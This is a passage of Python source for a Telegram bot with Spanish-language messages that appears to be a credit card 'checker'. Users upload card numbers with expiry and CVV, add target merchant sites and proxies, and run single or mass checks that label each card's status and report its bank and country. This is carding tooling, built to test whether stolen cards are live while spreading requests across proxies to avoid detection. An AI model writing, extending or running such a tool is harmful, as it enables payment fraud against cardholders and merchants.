    reply_markup = InlineKeyboardMarkup(keyboard)
    await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    context.user_data['last_mass_results'] = results
    context.user_data['last_mass_cards'] = valid_cards

async def mass_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    if user_id in active_mass:
        cancel_mass[user_id] = True
        await query.answer("⏹ Stopping mass check...")
    else:
        await query.answer("No active mass check.")

async def mass_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    results = context.user_data.get('last_mass_results', [])
    cards = context.user_data.get('last_mass_cards', [])
    
    if not results:
        await query.answer("No results available.")
        return
    
    filename = f"mass_{user_id}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(cards)}\n")
        f.write("="*80 + "\n\n")
        
        for i, r in enumerate(results, 1):
            emoji = get_status_emoji(r.status)
            f.write(f"[{i}] {emoji} Card: {r.job.card_data['bin']}xxxxxx{r.job.card_data['last4']}\n")
            f.write(f"    Status: {r.status.value.upper()} ({r.confidence.value})\n")
            f.write(f"    Reason: {r.reason}\n")
            f.write(f"    Time: {r.response_time:.2f}s\n")
            f.write(f"    Site: {r.job.site}\n")
            f.write(f"    Proxy: {r.job.proxy}\n")
            f.write("-"*40 + "\n")
    
    with open(filename, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption="📊 Mass check results"
        )
    
    os.remove(filename)
    await query.answer("Results sent!")

# ================== MANEJO DE BOTONES ==================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    if user_id in active_mass and data != "mass_stop":
        await query.edit_message_text(
            "❌ Mass check in progress. Use STOP button to cancel."
        )
        return
    
    # ===== NAVEGACIÓN PRINCIPAL =====
    if data == "menu_main":
        await show_main_menu(update, context, edit=True)
    
    # ===== CHECK CARD =====
    elif data == "menu_check":
        await show_check_menu(update, context)
    elif data == "check_one":
        text = (
            "💳 *CHECK ONE CARD*\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Send the card in this format:\n"
            "`NUMBER|MONTH|YEAR|CVV`\n\n"
            "Example:\n"
            "`4377110010309114|08|2026|501`"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_check")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        user_state[user_id] = "awaiting_single_card"
    elif data == "check_howto":
        await check_howto(update, context)
    
    # ===== MASS CHECK =====
    elif data == "menu_mass":
        await show_mass_menu(update, context)
    elif data == "mass_start":
        await mass_start(update, context)
    elif data == "mass_stop":
        await mass_stop(update, context)
    elif data == "mass_download":
        await mass_download(update, context)
    elif data == "mass_workers":
        await mass_workers_settings(update, context)
    elif data == "mass_upload":
        text = (
            "📄 *UPLOAD CARDS FOR MASS*\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Send a `.txt` file with cards.\n\n"
            "Format:\n"
            "`NUMBER|MONTH|YEAR|CVV`\n\n"
            "One per line."
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_mass")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        user_state[user_id] = "awaiting_cards_file"
    
    # ===== SITES =====
    elif data == "menu_sites":
        await show_sites_menu(update, context)
    elif data == "sites_add":
        await sites_add_prompt(update, context)
    elif data == "sites_list":
        await sites_list(update, context)
    elif data == "sites_remove":
        await sites_remove_prompt(update, context)
    elif data.startswith("remove_site_"):
        try:
            index = int(data.split("_")[2]) - 1
            user_data = await user_manager.get_user_data(user_id)
            sites = user_data["sites"]
            
            if 0 <= index < len(sites):
                removed = sites.pop(index)
                await user_manager.update_user_data(user_id, sites=sites)
                await query.edit_message_text(f"✅ Site removed: {removed}")
            else:
                await query.edit_message_text("❌ Invalid index.")
        except:
            await query.edit_message_text("❌ Error removing site.")
        
        await asyncio.sleep(2)
        await show_sites_menu(update, context)
    
    # ===== PROXIES =====
    elif data == "menu_proxies":
        await show_proxies_menu(update, context)
    elif data == "proxies_add":
        await proxies_add_prompt(update, context)
    elif data == "proxies_list":
        await proxies_list(update, context)
    elif data == "proxies_health":
        await proxies_health(update, context)
    elif data == "proxies_clean":
        await proxies_clean_confirm(update, context)
    elif data == "proxies_clean_yes":
        await proxies_clean_execute(update, context)
    
    # ===== CARDS =====
    elif data == "menu_cards":
        await show_cards_menu(update, context)
    elif data == "cards_upload":
        await cards_upload_prompt(update, context)
    elif data == "cards_list":
        await cards_list(update, context)
    elif data == "cards_remove":
        await cards_remove_prompt(update, context)
    elif data.startswith("remove_card_"):
        try:
            index = int(data.split("_")[2]) - 1
            user_data = await user_manager.get_user_data(user_id)
            cards = user_data["cards"]
            
            if 0 <= index < len(cards):
                removed = cards.pop(index)
                bin_code = removed.split('|')[0][:6]
                last4 = removed.split('|')[0][-4:]
                await user_manager.update_user_data(user_id, cards=cards)
                await query.edit_message_text(f"✅ Card removed: {bin_code}xxxxxx{last4}")
            else:
                await query.edit_message_text("❌ Invalid index.")
        except:
            await query.edit_message_text("❌ Error removing card.")
        
        await asyncio.sleep(2)
        await show_cards_menu(update, context)
    
    # ===== STATS =====
    elif data == "menu_stats":
        await show_stats(update, context)
    
    # ===== SETTINGS =====
    elif data == "menu_settings":
        await show_settings(update, context)
    elif data == "settings_workers":
        await settings_workers(update, context)
    elif data == "settings_timeout":
        await settings_timeout(update, context)
    elif data == "settings_rules":
        await settings_rules(update, context)
    
    else:
        await query.edit_message_text(
            f"❌ Unknown option: {data}",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Back", callback_data="menu_main")
            ]])
        )

# ================== MANEJO DE MENSAJES ==================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in active_mass:
        await update.message.reply_text("❌ Mass check in progress. Use /stop to cancel.")
        return
    
    if user_id in user_state:
        state = user_state[user_id]
        
        if state == "awaiting_site_url":
            url = text.strip()
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            user_data = await user_manager.get_user_data(user_id)
            user_data["sites"].append(url)
            await user_manager.update_user_data(user_id, sites=user_data["sites"])
            
            await update.message.reply_text(f"✅ Site added: {url}")
            del user_state[user_id]
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Sites", callback_data="menu_sites")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("What's next?", reply_markup=reply_markup)
        
        elif state == "awaiting_proxy":
            proxy_input = text.strip()
            colon_count = proxy_input.count(':')
            
            if colon_count == 1:
                proxy = f"{proxy_input}::"
            elif colon_count == 3:
                proxy = proxy_input
            else:
                await update.message.reply_text("❌ Invalid proxy format.")
                return
            
            user_data = await user_manager.get_user_data(user_id)
            user_data["proxies"].append(proxy)
            await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
            
            display = proxy.split(':')[0] + ':' + proxy.split(':')[1]
            await update.message.reply_text(f"✅ Proxy added: {display}")
            del user_state[user_id]
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Proxies", callback_data="menu_proxies")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("What's next?", reply_markup=reply_markup)
        
        elif state == "awaiting_single_card":
            card_str = text.strip()
            card_data = CardValidator.parse_card(card_str)
            
            if not card_data:
                await update.message.reply_text("❌ Invalid card format.")
                return
            
            user_data = await user_manager.get_user_data(user_id)
            sites = user_data["sites"]
            proxies = user_data["proxies"]
            
            if not sites or not proxies:
                await update.message.reply_text("❌ Missing sites or proxies.")
                return
            
            # Rate limit
            allowed, msg = await user_manager.check_rate_limit(user_id, "check")
            if not allowed:
                await update.message.reply_text(msg)
                return
            
            msg = await update.message.reply_text("🔄 Checking...")
            
            site = sites[0]
            proxy = proxies[0]
            
            result = await card_service.check_single(user_id, card_data, site, proxy)
            await user_manager.increment_checks(user_id, "check")
            
            emoji = get_status_emoji(result.status)
            confidence_icon = get_confidence_icon(result.confidence)
            
            response = (
                f"{emoji} *RESULTADO*\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"💳 Tarjeta: `{card_data['bin']}xxxxxx{card_data['last4']}`\n"
                f"📊 Estado: {result.status.value.upper()}\n"
                f"{confidence_icon} Confianza: {result.confidence.value}\n"
                f"📝 Razón: {result.reason}\n"
                f"⏱️ Tiempo: {result.response_time:.1f}s\n"
            )
            
            if result.price != "N/A":
                response += f"💰 Precio: {result.price}\n"
            
            response += f"\n🏦 Banco: {result.bin_info.get('bank', 'Unknown')}\n"
            response += f"🌍 País: {result.bin_info.get('country', 'UN')}"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Check", callback_data="menu_check")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await msg.edit_text(response, parse_mode="Markdown", reply_markup=reply_markup)
            
            del user_state[user_id]
        
        else:
            del user_state[user_id]
            await show_main_menu(update, context, edit=False)
    
    else:
        # Si no hay estado, mostrar menú principal
        await show_main_menu(update, context, edit=False)

# ================== MANEJO DE ARCHIVOS ==================
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if user_id in active_mass:
        await update.message.reply_text("❌ Mass check in progress. Use /stop to cancel.")
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    text = file_content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    sites_added = []
    proxies_added = []
    cards_added = []
    invalid_lines = []
    unknown = []
    
    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue
        
        line_type, normalized = detect_line_type(line)
        
        if line_type == 'site':
            sites_added.append(normalized)
        elif line_type == 'proxy':
            if normalized.count(':') == 1:
                normalized = f"{normalized}::"
            proxies_added.append(normalized)
        elif line_type == 'card':
            card_data = CardValidator.parse_card(normalized)
            if card_data:
                cards_added.append(normalized)
            else:
                invalid_lines.append(line)
        else:
            unknown.append(line)
    
    user_data = await user_manager.get_user_data(user_id)
    updated = False
    
    if sites_added:
        user_data["sites"].extend(sites_added)
        updated = True
    if proxies_added:
        user_data["proxies"].extend(proxies_added)
        updated = True
    if cards_added:
        user_data["cards"].extend(cards_added)
        updated = True
    
    if updated:
        await user_manager.update_user_data(
            user_id, 
            sites=user_data["sites"], 
            proxies=user_data["proxies"], 
            cards=user_data["cards"]
        )
    
    msg_parts = []
    if sites_added:
        msg_parts.append(f"✅ {len(sites_added)} sitio(s) añadido(s)")
    if proxies_added:
        msg_parts.append(f"✅ {len(proxies_added)} proxy(s) añadido(s)")
    if cards_added:
        msg_parts.append(f"✅ {len(cards_added)} tarjeta(s) válida(s) añadida(s)")
    if invalid_lines:
        msg_parts.append(f"⚠️ {len(invalid_lines)} tarjeta(s) inválida(s) rechazada(s)")
    if unknown:
        msg_parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")
    
    if not msg_parts:
        await update.message.reply_text("❌ No valid data found in file.")
    else:
        await update.message.reply_text("\n".join(msg_parts))

# ================== COMANDO START (CORREGIDO) ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_mass:
        active_mass.discard(user_id)
    
    # ✅ AHORA SÍ muestra el menú con botones
    await show_main_menu(update, context, edit=False)

# ================== COMANDO STOP ==================
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass:
        cancel_mass[user_id] = True
        await update.message.reply_text("⏹ Stopping mass check...")
    else:
        await update.message.reply_text("No active mass check.")

# ================== COMANDO SETWORKERS ==================
async def setworkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in Settings.ADMIN_IDS:
        await update.message.reply_text("❌ Not authorized.")
        return
    
    if not context.args:
        await update.message.reply_text(f"Current max workers: {Settings.MAX_WORKERS_PER_USER}")
        return
    
    try:
        new_value = int(context.args[0])
        if 1 <= new_value <= 20:
            Settings.MAX_WORKERS_PER_USER = new_value
            await update.message.reply_text(f"✅ Max workers set to {new_value}")
        else:
            await update.message.reply_text("❌ Value must be between 1 and 20.")
    except ValueError:
        await update.message.reply_text("❌ Invalid number.")

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Cerrando...")
    if db:
        await db.shutdown()
    logger.info("✅ Cerrado")

async def post_init(application: Application):
    global db, user_manager, card_service
    
    db = Database()
    await db.initialize()
    await db.cleanup_old_results()
    
    user_manager = UserManager(db)
    card_service = CardCheckService(db, user_manager)
    
    logger.info("✅ Bot inicializado con clasificación mejorada")

def main():
    app = Application.builder().token(Settings.TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("setworkers", setworkers_command))
    
    app.add_handler(CallbackQueryHandler(button_handler))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))

    logger.info("🚀 Bot iniciado - SIN COOLDOWN - CLASIFICACIÓN MEJORADA - MENÚ COMPLETO")
    app.run_polling()

if __name__ == "__main__":
    main()
